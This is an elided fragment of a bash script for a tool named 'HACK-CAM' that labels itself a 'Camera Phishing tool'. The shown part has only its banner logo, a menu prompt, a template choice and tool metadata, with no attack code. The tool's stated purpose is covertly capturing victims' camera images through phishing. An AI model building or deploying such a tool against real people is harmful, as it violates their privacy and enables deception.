...
# Logo 
logo="    
${blue}  _   _    _    ____ _  __      ____    _    __  __ 
${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | 
${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| | 
${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | 
${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|
${green}                                               Hacker2108
"
...
sleep 1
printf "${cyan}\nHacker2108{nc}@${blue}Hacker2108 ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAM]"
        echo -e "$red[Version]    ${cyan} :[2.1]"
        echo -e "$red[Description]${cyan} :[Camera Phishing tool]"
        printf "${cyan}\nHacker2108${nc}@${cyan}Hacker2108 ${red}$ ${nc}"
        read about
